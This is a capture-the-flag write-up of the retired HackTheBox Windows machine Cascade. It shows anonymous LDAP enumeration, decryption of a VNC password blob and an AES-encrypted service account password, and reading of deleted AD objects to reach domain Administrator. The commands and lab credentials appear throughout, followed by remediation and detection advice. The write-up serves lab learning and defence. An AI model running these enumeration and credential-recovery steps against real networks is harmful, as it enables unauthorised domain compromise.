---
# ─── Post settings ──────────────────────────────────────────────
title: "HackTheBox: Cascade - Medium Windows"
date: 2025-06-26 15:00:00 -0400
categories: [HackTheBox, Windows]        # max 2 levels: [Main, Sub]
tags: [windows, active directory, privesc]          # lowercase, as many as you like
description: >-
  Cascade is a medium Windows machine that starts with zero credentials. Anonymous LDAP enumeration leaks a base64 password, which opens SMB shares holding a reversible VNC password and an audit database. Decrypting the database recovers a service account that belongs to the AD Recycle Bin group, letting us read a deleted TempAdmin object whose password was reused for the domain Administrator.
image:
  path: banner.png
pin: false
toc: true
math: false
mermaid: false
---

## Overview

| | |
|---|---|
| **Platform** | HackTheBox |
| **Difficulty** | Medium |
| **OS** | Windows |
| **Key techniques** | Anonymous LDAP, Reversible Encryption, AD Recycle Bin, Password Reuse |

Cascade is an old-school AD box that rewards patient enumeration. Every step leaks a credential that unlocks the next, and the whole thing hinges on passwords that were stored reversibly, in LDAP attributes, in a VNC registry blob, and in a .NET audit app, instead of as one-way hashes.

> This post covers a retired box. Spoilers ahead.
{: .prompt-info }

## Recon

### Port scan

We start with **no credentials** at all.

```bash
nmap -A -Pn -p- 10.10.10.182 -oA nmap_output/cascade.htb
```

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local)
445/tcp   open  microsoft-ds?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Classic domain controller (`CASC-DC1`, domain `cascade.local`), and notably running on Server 2008 R2.

### LDAP enumeration

With no creds, the first thing worth testing is whether LDAP allows an anonymous bind. It does:

```bash
ldapsearch -x -H ldap://10.10.10.182 -b "dc=cascade,dc=local"
```

That's enough to pull the full user list. NetExec makes this easy:

```bash
nxc ldap 10.10.10.182 -u "" -p "" --users-export users.txt
```

```text
-Username-     -Last PW Set-
arksvc         2020-01-09 11:18:20
s.smith        2020-01-28 14:58:05
r.thompson     2020-01-09 14:31:26
j.wakefield    ...
BackupSvc      ...
i.croft        ...
```

AS-REP roasting the list came up empty (no accounts had pre-auth disabled), so I went back to the LDAP data itself.

## Initial Access

Reading the full LDAP object for `r.thompson` turns up a non-standard attribute, `cascadeLegacyPwd`, holding a base64 string. Decoding it gives a plaintext password:

![r.thompson legacy password decoded](rthompson-pwd.png){: w="800" }

```text
r.thompson/rY4n5eva
```


## Privilege Escalation

### r.thompson → s.smith (reversible VNC password)

With r.thompson's creds we can enumerate and read SMB shares:

```bash
nxc smb 10.10.10.182 -u "r.thompson" -p rY4n5eva --shares
```

Digging through the readable shares turns up a `Data` share, and inside it a folder tied to `s.smith` containing a VNC configuration with an encrypted password blob. VNC stores passwords with a fixed, publicly known DES key, so the "encryption" is reversible:

```bash
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | \
  openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d \
  -provider legacy -provider default | hexdump -Cv
```

That recovers s.smith's password and, since s.smith has broader share access, opens up the `Audit$` share.

### s.smith → arksvc (audit database)

The `Audit$` share holds a .NET auditing tool (`CascAudit.exe` / `CascCrypto.dll`) and a SQLite database. Dumping the database reveals an encrypted password for the `ArkSvc` account:

```sql
INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');
```

Reversing the .NET binary gives up the AES-128-CBC key and IV it uses, and decrypting the blob (I scripted it in Python) yields the cleartext:

![ArkSvc password decrypted](arksvc-pwd.png){: w="800" }

```text
ArkSvc/w3lc0meFr31nd
```

## Root / Flags

### arksvc → Administrator (AD Recycle Bin + password reuse)

`ArkSvc` is a member of the **AD Recycle Bin** group, which means it can read deleted objects. That same audit database had a `DeletedUserAudit` table naming a `TempAdmin` account, strongly hinting at what to look for. Querying the tombstoned object as arksvc exposes *its* `cascadeLegacyPwd` attribute:

```powershell
Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
```

![TempAdmin deleted object with legacy password](tempadmin.png){: w="800" }

Decoding that base64 gives the TempAdmin password, and TempAdmin's password was reused for the actual domain **Administrator**:

```bash
echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
```

```text
Administrator/baCT3r1aN00dles
```

Confirming with WinRM:

![Administrator authenticated over WinRM](root.png){: w="800" }

Box rooted.

> As an aside: on my first run I actually took an unintended shortcut with `noPac` straight from the first user. It works, but it isn't the intended path, so I went back and did it properly through the Recycle Bin.
{: .prompt-warning }

## Lessons Learned

- **Reversible is not encrypted.** This box reuses the same anti-pattern three times, a base64 LDAP attribute, a fixed-key VNC blob, and a hardcoded AES key in a .NET app. None of them survive contact with an attacker who can read the data.
- **Anonymous LDAP bind is a free user list and sometimes free credentials.** It cost nothing and handed over the first foothold.
- **Deleted objects keep their secrets.** The TempAdmin account was gone from the normal directory but its reused password was recoverable straight out of the Recycle Bin.

## Remediation

How a defender would fix this:

- Disable anonymous LDAP binds and never store credentials in directory attributes.
- Don't rely on reversible password storage (VNC, in-house crypto with embedded keys). Treat anything with a recoverable key as plaintext.
- Enforce unique passwords, the Administrator compromise was pure password reuse from a decommissioned account. Scrub credentials from deleted objects and restrict AD Recycle Bin read access.

How a defender would detect this:

- Alert on anonymous LDAP binds and on access to sensitive SMB shares (`Audit$`) by non-administrative users.
- Monitor reads of deleted objects / Recycle Bin enumeration by service accounts.
- Flag Administrator logons from unusual sources (Event ID 4624/4648) over WinRM.

## References

- [AD Recycle Bin abuse](https://www.thehacker.recipes/ad/movement/dacl)
- [VNC password decryption](https://github.com/frizb/PasswordDecrypts)
